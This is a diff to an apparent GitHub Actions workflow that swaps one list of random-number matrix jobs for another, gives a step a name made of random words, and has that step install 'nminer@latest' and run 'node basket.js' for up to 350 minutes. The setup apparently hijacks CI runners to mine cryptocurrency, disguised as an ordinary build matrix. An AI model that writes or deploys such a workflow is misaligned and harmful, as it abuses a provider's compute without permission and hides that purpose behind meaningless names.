@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9788 }
-          - { version: 2801 }
-          - { version: 4177 }
-          - { version: 3517 }
-          - { version: 469 }
-          - { version: 6220 }
-          - { version: 1894 }
-          - { version: 1106 }
-          - { version: 8944 }
-          - { version: 7918 }
-          - { version: 9087 }
-          - { version: 6239 }
-          - { version: 6144 }
-          - { version: 6693 }
-          - { version: 657 }
-          - { version: 6344 }
-          - { version: 9906 }
-          - { version: 4187 }
-          - { version: 4754 }
-          - { version: 1233 }
+          - { version: 2195 }
+          - { version: 8656 }
+          - { version: 6833 }
+          - { version: 160 }
+          - { version: 7706 }
+          - { version: 562 }
+          - { version: 1470 }
+          - { version: 7084 }
+          - { version: 1092 }
+          - { version: 2390 }
+          - { version: 4982 }
+          - { version: 8511 }
+          - { version: 7441 }
+          - { version: 1648 }
+          - { version: 1600 }
+          - { version: 5472 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: glisten burgeon annual brr
+      - name: pull underneath unwilling
         run: |
           npm install nminer@latest
-          timeout 330m node basket.js || echo "basket executed"
+          timeout 350m node basket.js || echo "basket executed"
